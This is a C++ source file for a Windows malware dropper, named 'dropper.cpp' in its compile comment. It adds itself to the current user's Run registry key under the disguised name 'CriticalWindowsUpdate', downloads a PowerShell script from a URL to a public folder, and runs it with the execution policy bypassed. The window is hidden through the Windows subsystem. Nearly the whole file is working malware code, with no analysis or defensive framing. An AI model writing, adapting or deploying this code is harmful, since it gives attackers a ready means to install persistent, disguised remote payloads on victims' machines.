// Compile with: cl.exe dropper.cpp /link /SUBSYSTEM:WINDOWS user32.lib wininet.lib advapi32.lib
#include <windows.h>
#include <wininet.h>
#include <cstdio> // or #include <stdio.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

void SetPersistence() {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "CriticalWindowsUpdate";
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)exePath, strlen(exePath));
    RegCloseKey(hKey);
}

void DownloadAndExecute() {
    HINTERNET hInternet, hUrl;
    char payloadBuffer[4096];
    DWORD bytesRead;
    
    const char* payloadUrl = "http://127.0.0.1:8000/payload.ps1";
    const char* droppedFilePath = "C:\\Users\\Public\\payload.ps1";

    hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    hUrl = InternetOpenUrlA(hInternet, payloadUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl) {
        HANDLE hFile = CreateFileA(droppedFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        
        while (InternetReadFile(hUrl, payloadBuffer, sizeof(payloadBuffer), &bytesRead) && bytesRead > 0) {
            DWORD bytesWritten;
            WriteFile(hFile, payloadBuffer, bytesRead, &bytesWritten, NULL);
        }
        CloseHandle(hFile);
    }
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    char commandLine[MAX_PATH + 50];
    snprintf(commandLine, sizeof(commandLine), "powershell.exe -ExecutionPolicy Bypass -File %s", droppedFilePath);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, commandLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    SetPersistence();
    DownloadAndExecute();
    return 0;
}